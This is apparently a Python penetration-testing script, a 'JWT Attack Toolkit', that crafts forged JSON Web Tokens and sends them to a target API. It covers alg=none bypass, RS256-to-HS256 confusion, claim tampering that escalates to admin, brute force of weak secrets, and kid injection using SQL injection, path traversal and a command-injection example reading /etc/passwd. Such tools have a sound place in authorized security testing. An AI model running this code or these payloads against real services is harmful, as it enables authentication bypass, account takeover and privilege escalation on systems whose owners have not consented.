#!/usr/bin/env python3
"""
JWT Tester — JSON Web Token Attack Toolkit

Tests JWT implementations for common vulnerabilities:
- Algorithm confusion (RS256 → HS256)
- None algorithm bypass
- Weak secret brute force
- Claim tampering (role, admin, sub)
- Key ID (kid) injection (SQLi, path traversal)
- JWK header injection
- Expiry bypass (exp removal)

Usage:
    python3 jwt_tester.py --token "eyJ..." --target https://api.target.com/me
    python3 jwt_tester.py --token "eyJ..." --wordlist /usr/share/seclists/Passwords/jwt.txt
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import struct
import sys
import time
from datetime import datetime
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FINDINGS_DIR = os.path.join(BASE_DIR, "findings")

GREEN = "\033[0;32m"
RED = "\033[0;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
BOLD = "\033[1m"
NC = "\033[0m"


def log(level, msg):
    colors = {"ok": GREEN, "err": RED, "warn": YELLOW, "info": CYAN, "vuln": RED}
    symbols = {"ok": "+", "err": "-", "warn": "!", "info": "*", "vuln": "🔴"}
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {colors.get(level, '')}{BOLD}[{symbols.get(level, '*')}]{NC} {msg}")


def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def decode_jwt(token):
    """Decode JWT without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        return None, None, None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        signature = parts[2]
        return header, payload, signature
    except Exception:
        return None, None, None


def sign_hs256(header, payload, secret):
    """Sign JWT with HS256."""
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")))
    signing_input = f"{header_b64}.{payload_b64}"
    signature = hmac.new(
        secret.encode() if isinstance(secret, str) else secret,
        signing_input.encode(),
        hashlib.sha256,
    ).digest()
    sig_b64 = b64url_encode(signature)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def create_none_token(payload):
    """Create JWT with alg=none."""
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")))
    return f"{header_b64}.{payload_b64}."


def http_request(url, token, timeout=10):
    """Send request with JWT and return response."""
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
    }
    try:
        req = Request(url, headers=headers)
        with urlopen(req, timeout=timeout) as resp:
            return {
                "status": resp.status,
                "body": resp.read().decode("utf-8", errors="replace"),
                "headers": dict(resp.headers),
            }
    except HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return {"status": e.code, "body": body, "headers": {}}
    except Exception as e:
        return {"status": 0, "body": str(e), "headers": {}}


class JWTTester:
    """JWT vulnerability tester."""

    def __init__(self, token, target_url=None, rate_limit=2.0):
        self.original_token = token
        self.target_url = target_url
        self.rate_limit = rate_limit
        self.header, self.payload, self.signature = decode_jwt(token)
        self.findings = []

        if not self.header or not self.payload:
            log("err", "Invalid JWT token")
            sys.exit(1)

    def _sleep(self):
        if self.rate_limit > 0:
            time.sleep(1.0 / self.rate_limit)

    def _test_token(self, token, test_name):
        """Test a crafted token against the target URL."""
        if not self.target_url:
            return None
        resp = http_request(self.target_url, token)
        self._sleep()
        return resp

    def _add_finding(self, vuln_type, severity, details, crafted_token=None, response=None):
        finding = {
            "type": vuln_type,
            "severity": severity,
            "details": details,
            "crafted_token": crafted_token,
            "response": {
                "status": response.get("status") if response else None,
                "body_preview": response.get("body", "")[:300] if response else None,
            } if response else None,
            "found_at": datetime.now().isoformat(),
        }
        self.findings.append(finding)
        log("vuln", f"[{severity}] {vuln_type}: {details}")
        return finding

    def analyze_token(self):
        """Analyze JWT structure and identify potential issues."""
        log("info", f"Algorithm: {self.header.get('alg', 'unknown')}")
        log("info", f"Type: {self.header.get('typ', 'unknown')}")
        log("info", f"Key ID (kid): {self.header.get('kid', 'not set')}")
        log("info", f"JWK URL (jku): {self.header.get('jku', 'not set')}")

        # Check claims
        if "exp" in self.payload:
            exp = self.payload["exp"]
            if exp < time.time():
                log("warn", f"Token is EXPIRED (exp={exp})")
            else:
                remaining = int(exp - time.time())
                log("info", f"Token expires in {remaining}s")

        if "sub" in self.payload:
            log("info", f"Subject (sub): {self.payload['sub']}")
        if "role" in self.payload or "roles" in self.payload:
            log("info", f"Roles: {self.payload.get('role', self.payload.get('roles'))}")
        if "admin" in self.payload:
            log("info", f"Admin: {self.payload.get('admin')}")
        if "iss" in self.payload:
            log("info", f"Issuer: {self.payload['iss']}")

        print()

    # ─── Attack 1: None algorithm bypass ───

    def test_none_algorithm(self):
        """Test if server accepts alg=none (no signature required)."""
        log("info", "Testing none algorithm bypass...")

        # Try various none variants
        none_algs = ["none", "None", "NONE", "nOnE"]

        for alg in none_algs:
            header = dict(self.header)
            header["alg"] = alg
            header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
            payload_b64 = b64url_encode(json.dumps(self.payload, separators=(",", ":")))

            # Try with empty sig and with original sig
            tokens = [
                f"{header_b64}.{payload_b64}.",
                f"{header_b64}.{payload_b64}.{self.signature}",
            ]

            for token in tokens:
                resp = self._test_token(token, f"none_alg_{alg}")
                if resp and resp["status"] == 200:
                    return self._add_finding(
                        "JWT_NONE_ALGORITHM",
                        "CRITICAL",
                        f"Server accepts alg={alg} — signature verification completely bypassed. "
                        f"Any JWT payload is accepted without signature.",
                        crafted_token=token,
                        response=resp,
                    )

        log("info", "  None algorithm rejected ✓")
        return None

    # ─── Attack 2: Algorithm confusion (RS256 → HS256) ───

    def test_algorithm_confusion(self):
        """Test RS256 → HS256 algorithm confusion.

        If server uses RS256 (asymmetric), try HS256 (symmetric) with public key as secret.
        """
        if self.header.get("alg") not in ("RS256", "RS384", "RS512"):
            log("info", "Skipping alg confusion (not RSA)")
            return None

        log("info", "Testing RS256 → HS256 algorithm confusion...")
        # Note: Full exploitation requires the public key, which we'd need to extract
        # from the server. We can detect the vulnerability by testing with an empty secret.

        header = dict(self.header)
        header["alg"] = "HS256"
        token = sign_hs256(header, self.payload, "")

        resp = self._test_token(token, "alg_confusion")
        if resp and resp["status"] == 200:
            return self._add_finding(
                "JWT_ALGORITHM_CONFUSION",
                "CRITICAL",
                "Server accepts HS256 token when expecting RS256. "
                "If public key is known, attacker can forge any token.",
                crafted_token=token,
                response=resp,
            )

        log("info", "  Algorithm confusion not exploitable ✓")
        return None

    # ─── Attack 3: Claim tampering ───

    def test_claim_tampering(self):
        """Test if modifying claims (role, admin, sub) is accepted."""
        log("info", "Testing claim tampering...")

        tamper_tests = []

        # Elevate role
        if "role" in self.payload:
            tampered = dict(self.payload)
            tampered["role"] = "admin"
            tamper_tests.append(("role→admin", tampered))

        if "roles" in self.payload:
            tampered = dict(self.payload)
            tampered["roles"] = ["admin", "superadmin"]
            tamper_tests.append(("roles→admin", tampered))

        # Set admin flag
        tampered = dict(self.payload)
        tampered["admin"] = True
        tamper_tests.append(("admin=true", tampered))

        # Change user ID
        if "sub" in self.payload:
            tampered = dict(self.payload)
            tampered["sub"] = "1"  # Try admin user ID
            tamper_tests.append(("sub→1", tampered))

        # Change user_id
        if "user_id" in self.payload:
            tampered = dict(self.payload)
            tampered["user_id"] = 1
            tamper_tests.append(("user_id→1", tampered))

        # Remove expiry
        if "exp" in self.payload:
            tampered = dict(self.payload)
            tampered["exp"] = int(time.time()) + 86400 * 365  # 1 year
            tamper_tests.append(("exp→1year", tampered))

        findings = []
        for test_name, tampered_payload in tamper_tests:
            # Create with none alg (combination attack)
            token = create_none_token(tampered_payload)
            resp = self._test_token(token, f"tamper_{test_name}")

            if resp and resp["status"] == 200:
                finding = self._add_finding(
                    "JWT_CLAIM_TAMPERING",
                    "CRITICAL",
                    f"Tampered claim '{test_name}' accepted with none algorithm. "
                    f"Full privilege escalation possible.",
                    crafted_token=token,
                    response=resp,
                )
                findings.append(finding)

        if not findings:
            log("info", "  Claim tampering with none alg rejected ✓")
        return findings

    # ─── Attack 4: Weak secret brute force ───

    def test_weak_secret(self, wordlist=None):
        """Brute force JWT secret with common passwords."""
        if self.header.get("alg") not in ("HS256", "HS384", "HS512"):
            log("info", "Skipping secret bruteforce (not HMAC)")
            return None

        log("info", "Testing weak JWT secrets...")

        # Default weak secrets
        common_secrets = [
            "secret", "password", "123456", "admin", "key", "jwt_secret",
            "supersecret", "changeme", "default", "test", "development",
            "production", "letmein", "qwerty", "abc123", "password1",
            "jwt", "token", "auth", "login", "", " ",
            "your-256-bit-secret", "your-secret-key", "my-secret-key",
            "secret-key", "secretkey", "jwt-secret", "jwtSecret",
        ]

        # Load wordlist if provided
        if wordlist and os.path.isfile(wordlist):
            log("info", f"Loading wordlist: {wordlist}")
            with open(wordlist) as f:
                common_secrets.extend(line.strip() for line in f if line.strip())
            log("info", f"Total secrets to test: {len(common_secrets)}")

        # Reconstruct signing input
        parts = self.original_token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}"
        original_sig = b64url_decode(parts[2])

        for secret in common_secrets:
            test_sig = hmac.new(
                secret.encode() if isinstance(secret, str) else secret,
                signing_input.encode(),
                hashlib.sha256,
            ).digest()

            if test_sig == original_sig:
                return self._add_finding(
                    "JWT_WEAK_SECRET",
                    "CRITICAL",
                    f"JWT secret cracked: '{secret}'. "
                    f"Attacker can forge any token with this secret.",
                    crafted_token=None,
                )

        log("info", f"  Tested {len(common_secrets)} secrets — none matched ✓")
        return None

    # ─── Attack 5: KID injection ───

    def test_kid_injection(self):
        """Test Key ID (kid) parameter injection.

        kid can be vulnerable to:
        - SQL injection: kid = "' UNION SELECT 'secret' --"
        - Path traversal: kid = "../../dev/null"
        - Command injection: kid = "| cat /etc/passwd"
        """
        if "kid" not in self.header:
            log("info", "No kid header — skipping kid injection")
            return None

        log("info", "Testing kid injection...")

        kid_payloads = [
            # SQL injection
            ("' UNION SELECT 'secret' --", "secret", "SQLi in kid"),
            ("' OR '1'='1", None, "SQLi boolean in kid"),
            # Path traversal
            ("../../dev/null", "", "Path traversal to /dev/null"),
            ("../../etc/hostname", None, "Path traversal to /etc/hostname"),
            # Empty key
            ("", "", "Empty kid"),
        ]

        findings = []
        for kid_value, sign_secret, desc in kid_payloads:
            header = dict(self.header)
            header["kid"] = kid_value

            if sign_secret is not None:
                token = sign_hs256(header, self.payload, sign_secret)
            else:
                # Use original signature
                header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
                payload_b64 = b64url_encode(json.dumps(self.payload, separators=(",", ":")))
                token = f"{header_b64}.{payload_b64}.{self.signature}"

            resp = self._test_token(token, f"kid_{desc}")
            if resp and resp["status"] == 200:
                finding = self._add_finding(
                    "JWT_KID_INJECTION",
                    "CRITICAL",
                    f"kid injection ({desc}) accepted. kid='{kid_value}'",
                    crafted_token=token,
                    response=resp,
                )
                findings.append(finding)

        if not findings:
            log("info", "  kid injection rejected ✓")
        return findings

    # ─── Run all tests ───

    def run_all(self, wordlist=None):
        """Run all JWT attacks."""
        self.analyze_token()

        self.test_none_algorithm()
        self.test_algorithm_confusion()
        self.test_claim_tampering()
        self.test_weak_secret(wordlist)
        self.test_kid_injection()

        return self.findings

    def save_findings(self, target_name):
        if not self.findings:
            log("info", "No JWT findings")
            return
        output_dir = os.path.join(FINDINGS_DIR, target_name)
        os.makedirs(output_dir, exist_ok=True)
        filepath = os.path.join(output_dir, "jwt_findings.json")
        with open(filepath, "w") as f:
            json.dump({"findings": self.findings, "token_info": {
                "algorithm": self.header.get("alg"),
                "claims": list(self.payload.keys()),
            }}, f, indent=2)
        log("ok", f"Saved {len(self.findings)} findings to {filepath}")

    def print_summary(self):
        print(f"\n{BOLD}{'='*60}{NC}")
        print(f"{BOLD}  JWT Test Summary{NC}")
        print(f"{'='*60}\n")
        if self.findings:
            for f in self.findings:
                color = RED if f["severity"] in ("CRITICAL", "HIGH") else YELLOW
                print(f"  {color}[{f['severity']}] {f['type']}{NC}")
                print(f"    {f['details'][:100]}")
        else:
            print(f"  {GREEN}No JWT vulnerabilities found ✓{NC}")
        print()


def main():
    parser = argparse.ArgumentParser(description="JWT Attack Toolkit")
    parser.add_argument("--token", required=True, help="JWT token to test")
    parser.add_argument("--target", help="Target URL to test tokens against")
    parser.add_argument("--wordlist", help="Wordlist for secret brute force")
    parser.add_argument("--rate-limit", type=float, default=2.0)
    args = parser.parse_args()

    tester = JWTTester(args.token, target_url=args.target, rate_limit=args.rate_limit)
    tester.run_all(wordlist=args.wordlist)
    tester.print_summary()

    if args.target:
        target_name = args.target.replace("https://", "").replace("http://", "").split("/")[0]
        tester.save_findings(target_name)


if __name__ == "__main__":
    main()
